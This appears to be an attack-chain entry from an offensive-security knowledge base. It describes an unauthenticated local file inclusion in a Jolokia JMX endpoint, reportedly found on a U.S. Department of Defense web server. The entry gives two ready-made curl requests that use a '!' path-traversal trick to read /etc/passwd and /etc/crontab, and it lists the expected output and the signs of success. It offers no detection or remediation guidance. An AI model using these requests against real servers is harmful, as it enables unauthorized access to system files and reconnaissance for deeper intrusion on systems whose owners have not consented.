---
id: ac-unauth-lfi-jolokia-dod
tags:
  - lfi
  - path-traversal
  - jolokia
  - information-disclosure
  - unauthenticated
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Jolokia-LFI-for-File-Inclusion]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.291Z'
description: >-
  An unauthenticated Local File Inclusion vulnerability in a Jolokia endpoint
  allows path traversal using the '!' symbol to read arbitrary local files on a
  U.S. Department of Defense web server, exposing sensitive system information
  like user accounts and cron jobs.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Unauthenticated LFI via Path Traversal in Jolokia Endpoint to Read Sensitive Files

Multi-stage attack chain demonstrating exploitation of an unauthenticated LFI vulnerability in a Jolokia JMX endpoint on a web server, allowing arbitrary file reads via path traversal with the '!' symbol. This leads to disclosure of sensitive system files, such as user accounts and scheduled tasks, on a U.S. Department of Defense server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Jolokia Endpoint] --> B[Path Traversal for File Inclusion]
    B --> C[Information Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-jolokia-lfi]]

### Target Environment

- Web platform with Jolokia JMX agent exposed
- Java-based application server (e.g., Tomcat with Jolokia)
- Linux OS on target (inferred from /etc paths)
- Open port 443 (HTTPS)

### Initial Access Requirements

- Network access to the target web server (public-facing)
- No credentials required (unauthenticated)
- Prior reconnaissance to identify Jolokia endpoint

## Detailed Attack Procedures

### Step 1: Read System Users via /etc/passwd
procedure: [[procedures/Exploit-Jolokia-LFI-for-File-Inclusion]]

**Objective**: Exploit the LFI vulnerability to read the /etc/passwd file, disclosing user accounts on the target server.

**Instructions**: Use [[commands/curl-jolokia-lfi]] to craft a request that traverses to /etc/passwd using '!' as the separator:

```bash
curl -k "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
```

**Expected Output**: The contents of /etc/passwd, listing usernames, UIDs, home directories, and shells.

**Success Indicators**:
- Response contains lines like "root:x:0:0:root:/root:/bin/bash"
- No authentication prompt or error

### Step 2: Read Scheduled Tasks via /etc/crontab
procedure: [[procedures/Exploit-Jolokia-LFI-for-File-Inclusion]]

**Objective**: Exploit the LFI vulnerability to read the /etc/crontab file, disclosing scheduled cron jobs and potential sensitive configurations.

**Instructions**: Use [[commands/curl-jolokia-lfi]] to craft a request that traverses to /etc/crontab using '!' as the separator:

```bash
curl -k "https://target.com/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab"
```

**Expected Output**: The contents of /etc/crontab, showing cron schedules and commands.

**Success Indicators**:
- Response contains cron entries like "* * * * * root /path/to/script"
- File contents returned without errors

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to arbitrary local files via Jolokia endpoint
2. Disclosure of system users from /etc/passwd
3. Exposure of scheduled tasks from /etc/crontab, aiding further reconnaissance

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
